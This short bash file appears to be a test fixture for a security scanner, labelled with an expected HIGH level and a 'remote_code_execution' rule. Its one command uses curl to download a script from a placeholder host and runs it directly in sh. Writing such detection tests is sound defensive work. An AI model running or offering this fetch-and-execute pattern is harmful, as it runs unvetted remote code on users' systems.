#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: remote_code_execution
sh -c "$(curl -fsSL https://example.com/i.sh)"
